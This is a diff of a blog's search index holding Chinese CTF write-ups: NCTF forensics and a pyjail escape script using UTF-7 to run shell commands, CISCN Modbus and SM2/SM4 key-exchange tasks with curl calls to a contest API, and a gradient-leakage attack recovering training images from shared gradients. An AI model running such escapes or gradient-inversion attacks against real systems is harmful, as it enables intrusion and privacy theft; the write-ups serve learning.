-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> ( <span class="string">&#x27;自行填充&#x27;</span>.sPLIt( <span class="string">&#x27;&lt;r_l:&#123;&amp;Z&#x27;</span> ) | %&#123; ([<span class="type">cOnVErt</span>]::toInt16( ([<span class="built_in">strING</span>]<span class="variable">$_</span> ) , <span class="number">16</span> )<span class="operator">-aS</span>[<span class="built_in">cHAr</span>])&#125; ) <span class="operator">-JOIN</span> <span class="string">&#x27;&#x27;</span> </span><br></pre></td></tr></table></figure>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> (([<span class="type">rUNtiME.INTERoPsERvIceS.MaRshal</span>]::PTRtOstrinGBsTr([<span class="type">runtIme.INTeRopSeRviCES.mARShAl</span>]::seCUResTrInGTObsTR(<span class="variable">$</span>(<span class="string">&#x27;自行填充&#x27;</span> | <span class="built_in">conVeRtto-SEcurEsTrIng</span> <span class="literal">-key</span> (<span class="number">143</span>..<span class="number">112</span>))) ) ) ) <span class="operator">-JOIN</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>最终得到原始脚本，获得flag</p>
-<h3 id="NCTF2077-slivery">NCTF2077: slivery</h3>
-<p><strong>考点：</strong></p>
-<p>首先在镜像文件中我们可以直接提取出一个flag.zip</p>
-<p>sliver-c2流量解密</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 sliver_pcap_parser.py --pcap dump.pcapng --filter http --domain_name 192.168.207.128</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 sliver_decrypt.py --transport http --file_path ./http-sessions.json --force minidump.dmp</span><br></pre></td></tr></table></figure>
-<p>P@33w000000rd_U_GOT解压压缩包</p>
-<h3 id="ezjail">ezjail</h3>
-<p><strong>考点：pyjail，UTF-7字符集利用</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from base64 import b64encode</span><br><span class="line">context.log_level=&quot;debug&quot;</span><br><span class="line"># s = process([&quot;python3&quot;,&quot;server.py&quot;])</span><br><span class="line">s = remote(&quot;node4.anna.nssctf.cn&quot;,28506)</span><br><span class="line">s.sendline(&quot;e&quot;)</span><br><span class="line">s.recvuntil(&quot; &gt; &quot;)</span><br><span class="line">#ls_exp = &quot;__import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)&quot;</span><br><span class="line">cat_flag_exp = &quot;__import__(&#x27;os&#x27;).system(&#x27;cat f*&#x27;)&quot;</span><br><span class="line">#s.sendline(b&#x27;#coding=utf7\r+&#x27; + b64encode(ls_exp.encode(&#x27;utf-16-</span><br><span class="line">be&#x27;)).replace(b&#x27;=&#x27;, b&#x27;&#x27;))</span><br><span class="line">s.sendline(b&#x27;#coding=utf7\r+&#x27; + b64encode(cat_flag_exp.encode(&#x27;utf-16-</span><br><span class="line">be&#x27;)).replace(b&#x27;=&#x27;, b&#x27;&#x27;))</span><br><span class="line">s.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>暂无环境，所以本题关注原理</p>
-<p>本题最开始显示的是⽩名单限制了特殊字符只有 +=#\r\n</p>
-<p>当时实际做的时候挺接近了，也想到了这一点，但是没有考虑到换行的问题</p>
-<h3 id="randommaker">randommaker</h3>
-<p><strong>考点：测信道</strong></p>
-<p>暂保留，不懂测信道</p>
-]]></content>
-      <categories>
-        <category>Writeup</category>
-      </categories>
-      <tags>
-        <tag>NCTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>2023Ciscn-Writeup</title>
-    <url>/2023/09/28/2023Ciscn-Writeup/</url>
-    <content><![CDATA[<h1>2023Ciscn-Writeup</h1>
-<h2 id="Misc">Misc</h2>
-<h3 id="签到卡">签到卡</h3>
-<p><strong>考点：签到</strong></p>
-<p>前往公众号查看提示</p>
-<img src="https://s2.loli.net/2023/09/29/oJZMzENhLVPRB3H.jpg" style="zoom: 50%;" />
-<p>print(open(‘/flag’).read())</p>
-<img src="https://s2.loli.net/2023/09/29/vP81gtA4meOCbzx.jpg" style="zoom: 65%;" />
-<h3 id="被加密的生产流量">被加密的生产流量</h3>
-<p><strong>考点：Modbus协议</strong></p>
-<p>下载附件得到一个modbus.pcap，用wireshark打开后，查看Modbus/TCP协议，按正常顺序排序。</p>
-<p><img src="https://s2.loli.net/2023/09/29/xVKGsjTdmtwIy43.jpg" alt=""></p>
-<p>在正常的数据流之后，在末尾段发现异常字母，逐一提取拼接，得到一个字符串</p>
-<p><img src="https://s2.loli.net/2023/09/29/n3l2yedwSfrbTUM.jpg" alt=""></p>
-<p>将字符串进行base32编码，得到flag</p>
-<p><img src="https://s2.loli.net/2023/09/29/KeXyMoC7NsWmgpl.jpg" alt=""></p>
-<h3 id="国粹">国粹</h3>
-<p><strong>考点：图片识别</strong></p>
-<p>下载附件给出了三个图</p>
-<p>观察题目那图发现多出一个一万，拼接考虑成x轴和y轴，猜测与坐标有关</p>
-<p>一万到九万是1-9，一筒到九筒是10-18，一条到九条是19-27，东南西北中发白是28-34，春夏秋冬梅兰竹菊是35-42</p>
-<p>所以将a中的作为横坐标，k作为纵坐标进行绘图</p>
-<p>得到最终的flag为flag{202305012359}</p>
-<h2 id="crypto">crypto</h2>
-<h3 id="国密">国密</h3>
-<p><strong>考点：可信计算</strong></p>
-<p>下载附件，查看提示，根据其密钥分发流程进行操作</p>
-<p><img src="https://s2.loli.net/2023/09/29/HTBcAo3kXvmD2Z5.jpg" alt=""></p>
-<p>首先发送</p>
-<p><code>curl -d &quot;name=%E7%8E%8B%E5%98%89%E5%AE%87&amp;school=%E5%93%88%E5%B0%94%E6%BB%A8%E7%90%86%E5%B7%A5%E5%A4%A7%E5%AD%A6&amp;phone=17625419356&quot; http://39.106.48.123:24920/api/login</code></p>
-<p>得到用户id</p>
-<p><code>&quot;id&quot;: &quot;7a86f8de-7824-48a7-957d-2896a8fcf7ce&quot;</code></p>
-<p>生成SM2算法的公钥和密钥</p>
-<p><code>A_Public_Key:C25D0FF8A640422159ABC18A2DE046F33E348A788356E09514C0FD47023D04621D43926D0E76B7325AA3FC5B1C9C1F44A46AED2E91198FFA0FE83990F326EB0B</code><br>
-<code>A_Private_Key:CB42D512CD6C0E170CDE1F7611946C797ED546BD017BF784CF954E1D4F4D2CAB</code></p>
-<p>发送公钥</p>
-<p>curl -d “id=7a86f8de-7824-48a7-957d-2896a8fcf7ce&amp;publicKey=C25D0FF8A640422159ABC18A2DE046F33E348A788356E09514C0FD47023D04621D43926D0E76B7325AA3FC5B1C9C1F44A46AED2E91198FFA0FE83990F326EB0B” <a href="http://39.106.48.123:24920/api/allkey">http://39.106.48.123:24920/api/allkey</a></p>
-<p>得到结果</p>
-<p><code>&#123;</code><br>
-<code>&quot;message&quot;: &quot;success&quot;,</code><br>
-<code>&quot;data&quot;: &#123;</code><br>
-<code>&quot;publicKey&quot;: &quot;0463e8cc27aa0be1438ad237b6f9bcf2180baf4ed91cb1706ad6beed7d4c91cedc387b93f47ddae75e949b3a0fcc17332614dbbc72ff3f4426bf4f0744b6af6d3b&quot;,</code><br>
-<code>&quot;privateKey&quot;: &quot;0b31854a2fdb1c7da50dc8850223b35099d92bd001fa8d9aa70e0a91292a7e00&quot;,</code><br>
-<code>&quot;randomString&quot;: &quot;036942bd54cf3183089cd6c2ea2962d8cccf37b3ac8c92a9a4663281f28ee49edd3162a0dabefba2c697c48cdd76a79ae8b6556a3957e3ad0ac89dea2f2937e2e9b446a0a907a03365ca8237e53395e914893ea55d12804396dd75f0e2cba03083d2cb7e0d50dabc9a37497c8faaa2d1&quot;,</code><br>
-<code>&quot;id&quot;: &quot;7a86f8de-7824-48a7-957d-2896a8fcf7ce&quot;</code><br>
-<code>&#125;</code><br>
-<code>&#125;</code></p>
-<p>将随机数C密文采用SM2算法解密，得到结果</p>
-<p><code>56 BE 6C 83 45 46 BE 80 76 44 C4 B5 AD C7 29 CD</code></p>
-<p>使用16字节随机数C明文，对私钥B_Private_Key密文，采用SM4ECB算法解密</p>
-<p><code>99 BE 58 13 90 48 3E 81  3C DE 0B B2 BD 27 6C 2A   98 26 16 B0 15 5D E0 6E  21 BF 41 47 73 A4 AB AE</code></p>
-<p>向服务器请求密钥，得到回应</p>
-<p><code>&#123;</code><br>
-<code>&quot;message&quot;: &quot;success&quot;,</code><br>
-<code>&quot;data&quot;: &#123;</code><br>
-<code>&quot;id&quot;: &quot;7a86f8de-7824-48a7-957d-2896a8fcf7ce&quot;,</code><br>
-<code>&quot;quantumString&quot;: &quot;a0c80a6b59232277fac84d8c2a7353435bc67bfe379ea1412146779d383a4f759d754bb8f06b6e3ae84d125b221feeb3f8c74737de7bdb821bb4725f7ae62efe5af67bbd60634e73936b34b657735e46c0c92ed91330b5d817870e48585050116cdef1f37c6d03bd2cb45d7df21e009c&quot;</code><br>
-<code>&#125;</code><br>
-<code>&#125;</code></p>
-<p>使用私钥B_Private_Key明文，对密钥D密文进行解密</p>
-<p><code>09 87 9B 5F 8D 9A 7F 83 32 7D 54 E3 59 84 38 C7</code></p>
-<p>发送验证，得到flag</p>
-<p><code>curl -d &quot;id=7a86f8de-7824-48a7-957d-2896a8fcf7ce&amp;quantumString=09879B5F8D9A7F83327D54E3598438C7&quot; http://39.106.48.123:24920/api/check</code><br>
-<code>curl -d &quot;id=7a86f8de-7824-48a7-957d-2896a8fcf7ce&quot; http://39.106.48.123:24920/api/search</code></p>
-<h3 id="Sign-in-passwd">Sign_in_passwd</h3>
-<p><strong>考点：换表base64</strong></p>
-<p>观察字符串，发现是符合base64的码表，但结尾不为=，大概是换表了</p>
-<p><img src="https://s2.loli.net/2023/09/29/MspnjIl3tJThkS2.jpg" alt=""></p>
-<p>将下面的那串字符串进行url解码，以此为码表，对上面的字符串进行解码</p>
-<p><img src="https://s2.loli.net/2023/09/29/65xfZkeKvhV93YL.jpg" alt=""></p>
-<p>最终解码出来的结果不知道为什么少了一个}，手动补上</p>
-<p><img src="https://s2.loli.net/2023/09/29/At3rckvpngz1aul.jpg" alt=""></p>
-]]></content>
-      <categories>
-        <category>Writeup</category>
-      </categories>
-      <tags>
-        <tag>ciscn</tag>
       </tags>
   </entry>
   <entry>
@@ -707,45 +707,6 @@
       </tags>
   </entry>
   <entry>
-    <title>AI-CTF（1）Alice-AI系列</title>
-    <url>/2023/11/17/AI-CTF%EF%BC%881%EF%BC%89Alice/</url>
-    <content><![CDATA[<h1>AI-CTF（1）Alice-AI系列</h1>
-<h2 id="2022-CTF">2022*CTF</h2>
-<h3 id="Alice’s-challenge">Alice’s challenge</h3>
-<p>题目描述</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Alice and Bob decided to train a better AI model with their own data sets. However, Bob doesn’t want to show Alice all his secrets, especially his original pictures, so he only gave Alice some training gradients. But is it really safe?</span><br><span class="line">艾丽斯和鲍勃决定使用各自的数据集训练一个更好的人工智能模型。然而，鲍勃不想向艾丽斯展示他所有的机密，特别是他的原始图片，所以他只提供了一些训练梯度给艾丽斯。但这真的安全吗？</span><br></pre></td></tr></table></figure>
-<p>从提示很明显看出本题的核心就是梯度恢复数据。</p>
-<p>这是出题人给出的完整exp，现在结合<a href="https://link.zhihu.com/?target=https%3A//github.com/mit-han-lab/dlg%E5%8E%9F%E8%AE%BA%E6%96%87%E5%A4%8D%E7%8E%B0%E4%BB%A3%E7%A0%81%E6%9D%A5%E8%A7%A3%E6%9E%90%E7%90%86%E8%A7%A3%E6%96%B9%E6%B3%95%E3%80%82">https://link.zhihu.com/?target=https%3A//github.com/mit-han-lab/dlg原论文复现代码来解析理解方法。</a></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">import</span> torch.nn.functional <span class="keyword">as</span> F</span><br><span class="line"><span class="keyword">from</span> torchvision <span class="keyword">import</span> transforms</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AliceNet2</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>(AliceNet2, self).__init__()</span><br><span class="line">        self.conv = \</span><br><span class="line">            nn.Sequential(</span><br><span class="line">            nn.Conv2d(<span class="number">3</span>,<span class="number">12</span>,kernel_size=<span class="number">5</span>,padding=<span class="number">2</span>,stride=<span class="number">2</span>),</span><br><span class="line">            nn.Sigmoid(),</span><br><span class="line">            nn.Conv2d(<span class="number">12</span>,<span class="number">12</span>,kernel_size=<span class="number">5</span>,padding=<span class="number">2</span>, stride=<span class="number">2</span>),</span><br><span class="line">            nn.Sigmoid(),</span><br><span class="line">            nn.Conv2d(<span class="number">12</span>,<span class="number">12</span>,kernel_size=<span class="number">5</span>,padding=<span class="number">2</span>,stride=<span class="number">1</span>),</span><br><span class="line">            nn.Sigmoid(),</span><br><span class="line">            nn.Conv2d(<span class="number">12</span>,<span class="number">12</span>,kernel_size=<span class="number">5</span>,padding=<span class="number">2</span>,stride=<span class="number">1</span>),</span><br><span class="line">            nn.Sigmoid(),</span><br><span class="line">        )</span><br><span class="line">        self.fc = \</span><br><span class="line">            nn.Sequential(</span><br><span class="line">            nn.Linear(<span class="number">768</span>, <span class="number">200</span>)</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        x = self.conv(x)</span><br><span class="line">        x = x.view(x.size(<span class="number">0</span>), -<span class="number">1</span>)</span><br><span class="line">        x = self.fc(x)</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">criterion</span>(<span class="params">pred_y, grand_y</span>):</span><br><span class="line">    <span class="comment"># This is the Cross entropy loss function</span></span><br><span class="line">    tmptensor=torch.mean(</span><br><span class="line">        torch.<span class="built_in">sum</span>(</span><br><span class="line">            - grand_y * F.log_softmax(pred_y, dim=-<span class="number">1</span>), <span class="number">1</span></span><br><span class="line">        ))</span><br><span class="line">    <span class="keyword">return</span> tmptensor</span><br><span class="line"></span><br><span class="line">ts1 = transforms.Compose([transforms.Resize(<span class="number">32</span>),transforms.CenterCrop(<span class="number">32</span>),transforms.ToTensor()])</span><br><span class="line">ts2 = transforms.ToPILImage()</span><br><span class="line"></span><br><span class="line">my_device = <span class="string">&quot;cpu&quot;</span></span><br><span class="line"><span class="keyword">if</span> torch.cuda.is_available():</span><br><span class="line">    my_device = <span class="string">&quot;cuda&quot;</span></span><br><span class="line"></span><br><span class="line">Net = torch.load(<span class="string">&#x27;./Net.model&#x27;</span>).to(my_device)</span><br><span class="line">outpath=<span class="string">&#x27;./grad/&#x27;</span></span><br><span class="line"></span><br><span class="line">torch.manual_seed(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):</span><br><span class="line">    original_dy_dx=dy_dx=torch.load(outpath+<span class="built_in">str</span>(i)+<span class="string">&#x27;.tensor&#x27;</span>)</span><br><span class="line">    dummy_data = torch.randn(<span class="number">1</span>,<span class="number">3</span>,<span class="number">32</span>,<span class="number">32</span>).to(my_device).requires_grad_(<span class="literal">True</span>)</span><br><span class="line">    dummy_label = torch.randn(<span class="number">1</span>,<span class="number">200</span>).to(my_device).requires_grad_(<span class="literal">True</span>)</span><br><span class="line">    optimizer = torch.optim.LBFGS([dummy_data, dummy_label])</span><br><span class="line">    history = []</span><br><span class="line">    <span class="keyword">for</span> iters <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">300</span>):</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">closure</span>():</span><br><span class="line">            optimizer.zero_grad()</span><br><span class="line">            pred = Net(dummy_data)</span><br><span class="line">            dummy_onehot_label = F.softmax(dummy_label, dim=-<span class="number">1</span>)</span><br><span class="line">            dummy_loss = criterion(pred,</span><br><span class="line">                                   dummy_onehot_label)</span><br><span class="line">            dummy_dy_dx = torch.autograd.grad(dummy_loss, Net.parameters(), create_graph=<span class="literal">True</span>)</span><br><span class="line">            grad_diff = <span class="number">0</span></span><br><span class="line">            grad_count = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> gx, gy <span class="keyword">in</span> <span class="built_in">zip</span>(dummy_dy_dx, original_dy_dx):</span><br><span class="line">                grad_diff += ((gx - gy) ** <span class="number">2</span>).<span class="built_in">sum</span>()</span><br><span class="line">                grad_count += gx.nelement()</span><br><span class="line">            grad_diff.backward()</span><br><span class="line">            <span class="keyword">return</span> grad_diff</span><br><span class="line"></span><br><span class="line">        optimizer.step(closure)</span><br><span class="line">        <span class="keyword">if</span> iters % <span class="number">10</span> == <span class="number">0</span>:</span><br><span class="line">            current_loss = closure()</span><br><span class="line">            <span class="built_in">print</span>(iters, <span class="string">&quot;%.4f&quot;</span> % current_loss.item())</span><br><span class="line">        history.append(ts2(dummy_data[<span class="number">0</span>].cpu()))</span><br><span class="line"></span><br><span class="line">    plt.figure(figsize=(<span class="number">12</span>, <span class="number">8</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">        plt.subplot(<span class="number">3</span>, <span class="number">10</span>, i + <span class="number">1</span>)</span><br><span class="line">        plt.imshow(history[i * <span class="number">10</span>])</span><br><span class="line">        plt.title(<span class="string">&quot;iter=%d&quot;</span> % (i * <span class="number">10</span>))</span><br><span class="line">        plt.axis(<span class="string">&#x27;off&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Dummy label is %d.&quot;</span> % torch.argmax(dummy_label, dim=-<span class="number">1</span>).item())</span><br><span class="line">    plt.show()</span><br></pre></td></tr></table></figure>
-<p>根据出题人给出的exp，尝试运行，但实际恢复效果却不太好？</p>
-<p>这边对每一部分代码进行解释</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">AliceNet2</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>(AliceNet2, self).__init__()</span><br><span class="line">        self.conv = \</span><br><span class="line">            nn.Sequential(</span><br><span class="line">            nn.Conv2d(<span class="number">3</span>,<span class="number">12</span>,kernel_size=<span class="number">5</span>,padding=<span class="number">2</span>,stride=<span class="number">2</span>),</span><br><span class="line">            nn.Sigmoid(),</span><br><span class="line">            nn.Conv2d(<span class="number">12</span>,<span class="number">12</span>,kernel_size=<span class="number">5</span>,padding=<span class="number">2</span>, stride=<span class="number">2</span>),</span><br><span class="line">            nn.Sigmoid(),</span><br><span class="line">            nn.Conv2d(<span class="number">12</span>,<span class="number">12</span>,kernel_size=<span class="number">5</span>,padding=<span class="number">2</span>,stride=<span class="number">1</span>),</span><br><span class="line">            nn.Sigmoid(),</span><br><span class="line">            nn.Conv2d(<span class="number">12</span>,<span class="number">12</span>,kernel_size=<span class="number">5</span>,padding=<span class="number">2</span>,stride=<span class="number">1</span>),</span><br><span class="line">            nn.Sigmoid(),</span><br><span class="line">        )</span><br><span class="line">        self.fc = \</span><br><span class="line">            nn.Sequential(</span><br><span class="line">            nn.Linear(<span class="number">768</span>, <span class="number">200</span>)</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        x = self.conv(x)</span><br><span class="line">        x = x.view(x.size(<span class="number">0</span>), -<span class="number">1</span>)</span><br><span class="line">        x = self.fc(x)</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">criterion</span>(<span class="params">pred_y, grand_y</span>):</span><br><span class="line">    <span class="comment"># This is the Cross entropy loss function</span></span><br><span class="line">    tmptensor=torch.mean(</span><br><span class="line">        torch.<span class="built_in">sum</span>(</span><br><span class="line">            - grand_y * F.log_softmax(pred_y, dim=-<span class="number">1</span>), <span class="number">1</span></span><br><span class="line">        ))</span><br><span class="line">    <span class="keyword">return</span> tmptensor</span><br></pre></td></tr></table></figure>
-<p>这里初识化定义了一个卷积神经网络模型LeNet，在原论文中除了LeNet网络模型，还有一种为Resnet，暂时先对这一种进行理解。序列里包含了四个卷积层，每个卷积层后面跟着一个 Sigmoid 激活函数。每个卷积层使用 5x5 的卷积核，具有不同的步长 (<code>stride</code>) 和池化(<code>padding</code>)。</p>
-<p>然后包含一个线性全连接层，输入特征数为 768（由前面的卷积层产生）和输出特征数为 200。通过这个全连接层，网络将图像的特征映射到一个 200 维的空间，通常用于图像分类及特征提取。</p>
-<p>其中forward方法定义了数据在通过模型时的前向传播过程，输入数据 <code>x</code> 经过卷积层处理，然后被拉直成一维向量，最后经过全连接层 得到最终输出。</p>
-<p>criterion 函数定义了交叉熵损失函数，用于衡量模型输出与目标标签之间的差异。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ts1 = transforms.Compose([transforms.Resize(<span class="number">32</span>),transforms.CenterCrop(<span class="number">32</span>),transforms.ToTensor()])</span><br><span class="line">ts2 = transforms.ToPILImage()</span><br></pre></td></tr></table></figure>
-<p>这里的两行主要是进行图像转换的一些操作，第一行用于图像转换为张量，第二行用于张量转换为图像，即图像的预处理和后处理。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_device = <span class="string">&quot;cpu&quot;</span></span><br><span class="line"><span class="keyword">if</span> torch.cuda.is_available():</span><br><span class="line">    my_device = <span class="string">&quot;cuda&quot;</span></span><br><span class="line"></span><br><span class="line">Net = torch.load(<span class="string">&#x27;./Net.model&#x27;</span>).to(my_device)</span><br><span class="line">outpath=<span class="string">&#x27;./grad/&#x27;</span></span><br></pre></td></tr></table></figure>
-<p>使用计算机cuda进行计算，以及对模型和张量数据的导入处理</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">torch.manual_seed(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
-<p><code>torch.manual_seed(0)</code> 的作用是设置 PyTorch 中的随机数生成器的种子为 0，相同的随机数种子将产生相同的随机数序列。而在这种攻击方法中，有涉及到伪标签和伪数据的初始化，所以设置seed种子，尽可能保证生成的相似性。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):</span><br><span class="line">    original_dy_dx=dy_dx=torch.load(outpath+<span class="built_in">str</span>(i)+<span class="string">&#x27;.tensor&#x27;</span>)</span><br><span class="line">    dummy_data = torch.randn(<span class="number">1</span>,<span class="number">3</span>,<span class="number">32</span>,<span class="number">32</span>).to(my_device).requires_grad_(<span class="literal">True</span>)</span><br><span class="line">    dummy_label = torch.randn(<span class="number">1</span>,<span class="number">200</span>).to(my_device).requires_grad_(<span class="literal">True</span>)</span><br><span class="line">    optimizer = torch.optim.LBFGS([dummy_data, dummy_label])</span><br><span class="line">    history = []</span><br><span class="line">    <span class="keyword">for</span> iters <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">300</span>):</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">closure</span>():</span><br><span class="line">            optimizer.zero_grad()</span><br><span class="line">            pred = Net(dummy_data)</span><br><span class="line">            dummy_onehot_label = F.softmax(dummy_label, dim=-<span class="number">1</span>)</span><br><span class="line">            dummy_loss = criterion(pred,</span><br><span class="line">                                   dummy_onehot_label)</span><br><span class="line">            dummy_dy_dx = torch.autograd.grad(dummy_loss, Net.parameters(), create_graph=<span class="literal">True</span>)</span><br><span class="line">            grad_diff = <span class="number">0</span></span><br><span class="line">            grad_count = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> gx, gy <span class="keyword">in</span> <span class="built_in">zip</span>(dummy_dy_dx, original_dy_dx):</span><br><span class="line">                grad_diff += ((gx - gy) ** <span class="number">2</span>).<span class="built_in">sum</span>()</span><br><span class="line">                grad_count += gx.nelement()</span><br><span class="line">            grad_diff.backward()</span><br><span class="line">            <span class="keyword">return</span> grad_diff</span><br><span class="line"></span><br><span class="line">        optimizer.step(closure)</span><br><span class="line">        <span class="keyword">if</span> iters % <span class="number">10</span> == <span class="number">0</span>:</span><br><span class="line">            current_loss = closure()</span><br><span class="line">            <span class="built_in">print</span>(iters, <span class="string">&quot;%.4f&quot;</span> % current_loss.item())</span><br><span class="line">        history.append(ts2(dummy_data[<span class="number">0</span>].cpu()))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>这一段是论文思想的核心重点就是创建dummy_data,dummy_label所得到的梯度与原始训练数据所得到的梯度的均方误差，再用损失函数对dummy_data,dummy_label最优化，不断迭代以恢复出原始数据，但是可能也就是这里存在问题，使得我实际得到的图像效果不佳，但暂时还没确定问题的原因。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">plt.figure(figsize=(<span class="number">12</span>, <span class="number">8</span>))</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">       plt.subplot(<span class="number">3</span>, <span class="number">10</span>, i + <span class="number">1</span>)</span><br><span class="line">       plt.imshow(history[i * <span class="number">10</span>])</span><br><span class="line">       plt.title(<span class="string">&quot;iter=%d&quot;</span> % (i * <span class="number">10</span>))</span><br><span class="line">       plt.axis(<span class="string">&#x27;off&#x27;</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;Dummy label is %d.&quot;</span> % torch.argmax(dummy_label, dim=-<span class="number">1</span>).item())</span><br><span class="line">   plt.show()</span><br></pre></td></tr></table></figure>
-<p>这一段就是将所优化后的数据进行可视化操作，以达成数据恢复的目的</p>
-<p>然后根据相关资料找了一个改进的攻击方法</p>
-]]></content>
-      <categories>
-        <category>AI</category>
-        <category>AI-CTF</category>
-      </categories>
-      <tags>
-        <tag>2022*CTF</tag>
-        <tag>AI</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>2024西湖论剑-Writeup</title>
     <url>/2024/02/02/2024%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-Writeup/</url>
     <content><![CDATA[<h1>2024西湖论剑-Writeup</h1>
@@ -791,6 +752,45 @@
       </categories>
       <tags>
         <tag>西湖论剑</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>AI-CTF（1）Alice-AI系列</title>
+    <url>/2023/11/17/AI-CTF%EF%BC%881%EF%BC%89Alice/</url>
+    <content><![CDATA[<h1>AI-CTF（1）Alice-AI系列</h1>
+<h2 id="2022-CTF">2022*CTF</h2>
+<h3 id="Alice’s-challenge">Alice’s challenge</h3>
+<p>题目描述</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Alice and Bob decided to train a better AI model with their own data sets. However, Bob doesn’t want to show Alice all his secrets, especially his original pictures, so he only gave Alice some training gradients. But is it really safe?</span><br><span class="line">艾丽斯和鲍勃决定使用各自的数据集训练一个更好的人工智能模型。然而，鲍勃不想向艾丽斯展示他所有的机密，特别是他的原始图片，所以他只提供了一些训练梯度给艾丽斯。但这真的安全吗？</span><br></pre></td></tr></table></figure>
+<p>从提示很明显看出本题的核心就是梯度恢复数据。</p>
+<p>这是出题人给出的完整exp，现在结合<a href="https://link.zhihu.com/?target=https%3A//github.com/mit-han-lab/dlg%E5%8E%9F%E8%AE%BA%E6%96%87%E5%A4%8D%E7%8E%B0%E4%BB%A3%E7%A0%81%E6%9D%A5%E8%A7%A3%E6%9E%90%E7%90%86%E8%A7%A3%E6%96%B9%E6%B3%95%E3%80%82">https://link.zhihu.com/?target=https%3A//github.com/mit-han-lab/dlg原论文复现代码来解析理解方法。</a></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">import</span> torch.nn.functional <span class="keyword">as</span> F</span><br><span class="line"><span class="keyword">from</span> torchvision <span class="keyword">import</span> transforms</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AliceNet2</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>(AliceNet2, self).__init__()</span><br><span class="line">        self.conv = \</span><br><span class="line">            nn.Sequential(</span><br><span class="line">            nn.Conv2d(<span class="number">3</span>,<span class="number">12</span>,kernel_size=<span class="number">5</span>,padding=<span class="number">2</span>,stride=<span class="number">2</span>),</span><br><span class="line">            nn.Sigmoid(),</span><br><span class="line">            nn.Conv2d(<span class="number">12</span>,<span class="number">12</span>,kernel_size=<span class="number">5</span>,padding=<span class="number">2</span>, stride=<span class="number">2</span>),</span><br><span class="line">            nn.Sigmoid(),</span><br><span class="line">            nn.Conv2d(<span class="number">12</span>,<span class="number">12</span>,kernel_size=<span class="number">5</span>,padding=<span class="number">2</span>,stride=<span class="number">1</span>),</span><br><span class="line">            nn.Sigmoid(),</span><br><span class="line">            nn.Conv2d(<span class="number">12</span>,<span class="number">12</span>,kernel_size=<span class="number">5</span>,padding=<span class="number">2</span>,stride=<span class="number">1</span>),</span><br><span class="line">            